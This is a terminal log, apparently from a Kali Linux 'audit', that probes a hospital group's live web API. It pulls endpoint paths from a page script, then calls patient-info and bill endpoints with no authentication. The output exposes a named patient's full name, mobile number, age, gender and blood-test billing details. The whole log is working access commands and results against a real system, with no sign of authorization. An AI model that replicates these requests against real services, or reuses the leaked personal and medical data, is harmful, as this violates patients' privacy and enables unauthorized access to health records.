@@ -1,0 +1,16 @@
+                                                                                                                                                                                                                                         
+┌──(kalics㉿kalics)-[~/narayana-audit]
+└─$ cd ~/narayana-audit && echo "=== 1. Top of invcanapprove.html script ===" && curl -k -s "https://narayanagroup.co.in/Nnote/invcanapprove.html" | grep -E -i '(apiURL|\$\.post|\$\.get|ajax)' && echo -e "\n=== 2. Patient/Info/1005411787 ===" && curl -k -s "https://narayanagroup.co.in/NnoteApi/api/Patient/Info/1005411787" && echo -e "\n=== 3. Investigation/Cancel/Bill ===" && curl -k -s "https://narayanagroup.co.in/NnoteApi/api/Investigation/Cancel/Bill/1005411787/202310090822/202310160001"
+=== 1. Top of invcanapprove.html script ===
+    var apiURL = '../../NnoteApi/api/';
+    //var apiURL = 'http://localhost:6491/api/';
+            $.post(apiURL + 'Investigation/Cancel/Approve', updateData, (response) => {
+        $.get(apiURL + 'Patient/Info/' + $("#hprno").val(), (response) => {
+        $.get(apiURL + 'Investigation/Cancel/Bill/' + $("#hprno").val() + '/' + $("#hobillno").val() + '/' + $("#hbillno").val(), (response) => {
+
+=== 2. Patient/Info/1005411787 ===
+{"data":[{"DrugBrandType":null,"TotalDrugs":null,"Campid":null,"RptType":null,"FromDate":null,"ToDate":null,"DatesBetween":null,"TotalCount":null,"Regno":1005411787,"PatientId":0,"IPatientId":0,"Name":"B.SUJATHAMMA","DOB":null,"Age":47,"AgeType":"Y","Gender":"F","MobileNo":"9550007814","Aadhar":null,"AdmitDate":null,"DischargeDate":null,"Department":null,"DeptCode":null,"DoctorName":null,"DoctorCode":null,"BedId":null,"BedCategory":null,"BedDescription":null,"WardName":null,"WardType":null,"PayType":null,"OrganisationCode":"LAB","PIN":0,"ConfirmPIN":0,"PatPhoto":null,"Attendant":null,"AttendantMobile":null,"StrContent":null,"PRegno":null,"PId":null,"feedbackcode":null,"feedbackname":null,"FeedbackGroupId":null,"FeedbackteamCode":null,"CallPatternCode":null,"ReceivedFeedback":null,"CallAttemptedTo":null,"CallStatus":null,"Remarks":null,"PatientStatus":null,"WardCode":null,"LinkFb":null,"EntryUser":null,"WorkTypeId":null,"ServiceRemarks":null,"PatientType":null,"OPNo":null,"Pkgdes":null,"Pkgamount":null,"PkgCount":null,"Pkgcode":null,"Pkgtype":null,"Q1":null,"Q2":null,"Q3":null,"Q4":null,"tariff":null,"Pakdeptcode":null,"PakRemark":null,"RowNo":0,"ItemCode":null,"ItemName":null,"Generic":null,"PharCompany":null,"Catg_desc":null,"Qty":null,"StoreCd":null,"Comapnyname":null,"Total":null,"RetailCompany":null,"Deptcode":null,"Deptname":null}]}
+=== 3. Investigation/Cancel/Bill ===
+{"data":[{"BillNo":"202310090822","BillDate":"10/9/2023 00:00:00","CancelTest":"Y","Charge":"400","CreditCharge":"0","DoctorCode":"","DoctorName":"SELF","DoctorFee":"","OrganisationCode":"","PaidCharge":"400","PatientId":"","PayType":"PAYING","Prno":"1005411787","Quantity":"1","RefDoctorCode":"SELF","Status":"E","TestCode":"NBBCRM01","TestDescription":"CROSS MATCHING & BLOOD GROUPING","TotalCharges":"1400"}]}                                                                                                                                                                                                                                            
+┌──(kalics㉿kalics)-[~/narayana-audit]
+└─$ 
